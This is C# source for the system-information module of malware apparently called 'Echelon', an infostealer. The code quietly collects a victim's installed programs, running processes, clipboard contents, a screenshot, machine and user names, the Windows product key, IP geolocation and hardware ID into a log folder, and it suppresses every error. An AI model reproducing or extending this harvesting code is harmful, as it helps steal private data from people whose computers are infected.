

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Echelon
{
    internal class Systemsinfo
    {
        public static string information = Help.collectionDir + "\\System_Information.txt";

        [STAThread]
        public static void GetSystemsData(string collectionDir)
        {

            try
            {
                var t01 = new Task[1] { new Task(() => GetSystem(collectionDir))};
                var t02 = new Task[1] { new Task(() => GetProg(collectionDir))};
                var t03 = new Task[1] { new Task(() => GetProc(collectionDir))};
                var t04 = new Task[1] { new Task(() => BuffBoard.GetClipboard(collectionDir))};
                var t05 = new Task[1] { new Task(() => Screenshot.GetScreenShot(collectionDir))};

                new Thread(() => { foreach (var t in t01) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t02) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t03) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t04) t.Start(); }).Start();
                new Thread(() => { foreach (var t in t05) t.Start(); }).Start();


                Task.WaitAll(t01);
                Task.WaitAll(t02);
                Task.WaitAll(t03);
                Task.WaitAll(t04);
                Task.WaitAll(t05);
            }
            catch { }
        }

        public static void GetProg(string Echelon_Dir)
        {
            using (var programmestext = new StreamWriter(Echelon_Dir + "\\Programms.txt", false, Encoding.Default))
            {
                try
                {
                    string displayName;
                    RegistryKey key;
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                    var keys = key.GetSubKeyNames();
                    for (var i = 0; i < keys.Length; i++)
                    {
                        var subkey = key.OpenSubKey(keys[i]);
                        displayName = subkey.GetValue("DisplayName") as string;
                        if (displayName == null) continue;
                        programmestext.WriteLine(displayName);
                    }
                }
                catch
                {
                }
            }
        }

        public static void GetProc(string Echelon_Dir)
        {
            try
            {
                using (var processest = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
                {
                    var processes = Process.GetProcesses();
                    for (var i = 0; i < processes.Length; i++) processest.WriteLine(processes[i].ProcessName);
                }
            }
            catch
            {
            }
        }

        public static string GetGpuName()
        {
            try
            {
                var gpuName = string.Empty;
                var query = "SELECT * FROM Win32_VideoController";
                using (var searcher = new ManagementObjectSearcher(query))
                { foreach (ManagementObject mObject in searcher.Get()) gpuName += mObject["Description"] + " ";
                }
                return !string.IsNullOrEmpty(gpuName) ? gpuName : "N/A";
            }
            catch { return "Unknown"; }
        }

        public static string GetPhysicalMemory() // Получаем кол-во RAM Памяти в мб
        {
            try
            {
                var scope = new ManagementScope();
                var query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
                var managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
                var num = 0L;
                foreach (var managementBaseObject in managementObjectCollection)
                {
                    var num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
                    num += num2;
                }
                num = num / 1024L / 1024L;
                return num.ToString();
            }
            catch { return "Unknown"; }
        }

        public static string GetOSInformation() //Получаем инфу об ОС
        {
            foreach (var managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
            {
                var managementObject = (ManagementObject)managementBaseObject;
                try
                {
                    return string.Concat(((string)managementObject["Caption"]).Trim(), ", ", (string)managementObject["Version"], ", ", (string)managementObject["OSArchitecture"]);
                }
                catch
                {
                }
            }
            return "BIOS Maker: Unknown";
        }


        public static string GetComputerName() // Получаем имя ПК
        {
            try
            {
                var instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
                var result = string.Empty;
                foreach (var managementBaseObject in instances) result = (string)((ManagementObject)managementBaseObject)["Name"];
                return result;
            }
            catch { return "Unknown"; }

        }

        public static string GetProcessorName() // Получаем название процессора
        {
            try
            {
                var instances = new ManagementClass("Win32_Processor").GetInstances();
                var result = string.Empty;
                foreach (var managementBaseObject in instances) result = (string)((ManagementObject)managementBaseObject)["Name"];
                return result;
            }
            catch { return "Unknown"; }
        }

        public static void GetSystem(string Echelon_Dir)
        {

            var pc = new ComputerInfo();

            //Системное инфо

            var resolution = Screen.PrimaryScreen.Bounds.Size; //getting resolution

            try
            {
                using (var langtext = new StreamWriter(information, false, Encoding.Default))
                {

                    langtext.WriteLine("==================================================" +
                        "\n Operating system: " + Environment.OSVersion + " | " + pc.OSFullName +
                        "\n PC user: " + Environment.MachineName + "/" + Environment.UserName +
                        "\n WinKey: " + WinKey.GetWindowsKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId") + 
                        "\n==================================================" +
                        "\n Screen resolution: " + resolution +
                        "\n Current time Utc: " + DateTime.UtcNow +
                        "\n Current time: " + DateTime.Now +
                        "\n==================================================" +
                        "\n CPU: " + GetProcessorName() +
                        "\n RAM: " + GetPhysicalMemory() +
                        "\n GPU: " + GetGpuName() +
                        "\n ==================================================" +
                        "\n IP Geolocation: " + Help.IP() + " " + Help.Country() +
                        "\n Log Date: " + Help.date +
                        "\n Version build: " + Program.buildversion +
                        "\n HWID: " + Help.HWID 


                        );

                    langtext.Close();

                }
            }
            catch
            {

            }
        }
    }
}
